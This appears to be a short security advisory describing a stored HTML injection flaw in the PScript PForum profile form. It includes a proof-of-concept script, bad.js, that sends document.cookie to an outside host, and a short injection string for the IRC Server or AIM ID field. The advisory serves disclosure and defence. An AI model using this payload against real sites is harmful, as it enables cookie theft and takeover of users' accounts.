PScript PForum is reported prone to a HTML injection vulnerability. The vulnerability presents itself due to a lack of sufficient sanitization performed on data submitted through input fields of the PForum user profile form.

This could be exploited to steal cookie-based authentication credentials. It is also possible to use this type of vulnerability as an attack vector to exploit latent browser security flaws.

Create a Javascript file and save it as bad.js (your domain name is in this
case example.com). The file contains the following code:

// bad.js
function b()
{
location.href='example.org/compute_stolen_data.ext?'+document.cookie;
}

Edit your profile and enter the following line into the IRC Server or AIM
ID Input Box. The string have to be shorter then 100 characters.

// Input Box (without line break)
"><script src=http://example.com/bad.js></script>
<img height=0 width=0 src=foo onerror=b(); >
